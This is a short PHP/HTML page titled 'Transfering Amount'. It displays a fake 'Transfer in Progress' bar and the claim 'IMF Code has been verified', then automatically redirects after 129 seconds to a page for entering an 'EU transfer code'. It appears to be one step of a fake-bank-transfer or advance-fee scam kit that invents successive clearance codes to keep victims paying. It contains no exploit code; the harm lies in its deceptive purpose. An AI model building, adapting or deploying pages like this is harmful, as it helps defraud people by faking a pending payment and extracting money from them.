<?php
	header('refresh: 129; url=enter_eu_transfer_code.php');
?>
<!DOCTYPE html>
<html lang="en">
<head>
<link href="css3/jquery-ui-1.8.16.custom.css" rel="stylesheet" type="text/css"/>
<link href="css3/main.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="js3/jquery-1.6.2.min.js"></script>
<script type="text/javascript" src="js3/jquery-ui-1.8.16.custom.min.js"></script> 
<script type="text/javascript" src="js3/script.js"></script>

<title>Transfering Amount</title>
</head>
<body>
    <div class="example">
        <h3>Transfer in Progress...</a></h3>
		<p>Please do not refresh your page. IMF Code has been verified</p>

        <div id="progress1">
            <div class="percent"></div>
            <div class="pbar"></div>
            <!--<div class="elapsed"></div>-->
        </div>
    </div>
</body>
</html>